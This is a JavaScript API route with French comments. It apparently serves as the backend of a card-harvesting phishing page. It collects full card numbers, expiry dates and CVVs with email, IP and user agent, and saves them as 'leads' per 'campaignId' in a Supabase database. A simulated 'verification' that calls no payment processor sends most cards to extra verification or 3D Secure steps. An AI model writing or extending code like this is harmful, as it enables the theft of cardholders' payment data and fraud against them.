import { LeadService } from '../../lib/supabase';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  try {
    const {
      campaignId,
      email,
      firstName,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvv,
      selectedPlan
    } = req.body;

    // Debug: Logger les données reçues (de façon sécurisée)
    console.log('API initiate-verification - Données reçues:', {
      campaignId: !!campaignId,
      email: !!email,
      firstName: !!firstName,
      cardName: !!cardName,
      cardNumber: cardNumber ? `****${cardNumber.slice(-4)}` : 'vide',
      cardExpiry: !!cardExpiry,
      cardCvv: !!cardCvv,
      selectedPlan: !!selectedPlan
    });

    // Validation détaillée des données requises
    const missingFields = [];
    if (!email) missingFields.push('email');
    if (!cardNumber) missingFields.push('cardNumber');
    if (!cardExpiry) missingFields.push('cardExpiry');
    if (!cardCvv) missingFields.push('cardCvv');
    if (!cardName) missingFields.push('cardName');

    if (missingFields.length > 0) {
      return res.status(400).json({
        error: `Champs manquants: ${missingFields.join(', ')}`,
        missingFields
      });
    }

    // Récupérer les informations de la requête
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const sessionId = req.headers['x-session-id'] || `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    // Préparer les données pour le tracking
    const leadData = {
      email,
      first_name: firstName,
      card_name: cardName,
      card_number: cardNumber,
      card_expiry: cardExpiry,
      card_cvv: cardCvv,
      selected_plan: selectedPlan,
      ip_address: ip,
      user_agent: userAgent,
      session_id: sessionId,
      verification_status: 'initiated'
    };

    // Logger de façon sécurisée (sans les données sensibles)
    console.log('Initiation vérification:', {
      email,
      firstName,
      selectedPlan,
      card_last_four: cardNumber ? cardNumber.replace(/\D/g, '').slice(-4) : 'N/A',
      sessionId
    });

    // Enregistrer ou mettre à jour le lead
    let lead = null;
    if (campaignId) {
      lead = await LeadService.createOrUpdateLead(campaignId, leadData, 'verification_initiated');
    }

    // Simuler la logique de vérification (inspirée de TrelloJoin)
    const verificationResult = await simulateVerificationProcess(leadData);

    // Répondre avec le résultat
    res.status(200).json({
      success: true,
      verificationId: `verif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      requiresAdditionalVerification: verificationResult.requiresAdditionalVerification,
      needs3DSecure: verificationResult.needs3DSecure,
      amount: selectedPlan === 'free' ? '0,00€' : '1,00€',
      lastFourDigits: cardNumber.replace(/\D/g, '').slice(-4),
      lead: lead ? {
        id: lead.id,
        email: lead.email,
        verification_status: lead.verification_status
      } : null
    });

  } catch (error) {
    console.error('Erreur lors de l\'initiation de vérification:', error);
    res.status(500).json({
      error: 'Erreur serveur lors de l\'initiation de la vérification',
      details: error.message
    });
  }
}

/**
 * Simuler le processus de vérification (logique inspirée de TrelloJoin)
 * @param {Object} leadData - Données du lead
 * @returns {Promise<Object>} Résultat de la simulation
 */
async function simulateVerificationProcess(leadData) {
  const cardNumber = leadData.card_number.replace(/\D/g, '');
  
  // Cartes de test qui passent directement
  const approvedTestCards = [
    '4242424242424242', // Visa test
    '4000000000000002', // Visa test - 3D Secure
    '5555555555554444', // Mastercard test
  ];
  
  // Cartes qui nécessitent une vérification supplémentaire
  const verification3DSecureCards = [
    '4000000000000044', // Visa - Always 3D Secure
    '4000000000000101', // Visa - 3D Secure with challenge
  ];

  // Déterminer le comportement basé sur la carte
  if (approvedTestCards.includes(cardNumber)) {
    return {
      status: 'requires_verification',
      requiresAdditionalVerification: true,
      needs3DSecure: false,
      message: 'Vérification additionnelle requise'
    };
  }
  
  if (verification3DSecureCards.includes(cardNumber)) {
    return {
      status: 'requires_3d_secure',
      requiresAdditionalVerification: true,
      needs3DSecure: true,
      message: 'Authentification 3D Secure requise'
    };
  }

  // Logique par défaut basée sur des patterns
  const lastDigit = parseInt(cardNumber.slice(-1));
  
  // 70% des cartes nécessitent une vérification (comme TrelloJoin)
  if (lastDigit <= 6) {
    return {
      status: 'requires_verification',
      requiresAdditionalVerification: true,
      needs3DSecure: lastDigit % 2 === 0, // 50% nécessitent 3D Secure
      message: 'Vérification de sécurité requise'
    };
  }
  
  // 30% passent directement (cas rare)
  return {
    status: 'approved',
    requiresAdditionalVerification: false,
    needs3DSecure: false,
    message: 'Vérification approuvée'
  };
} 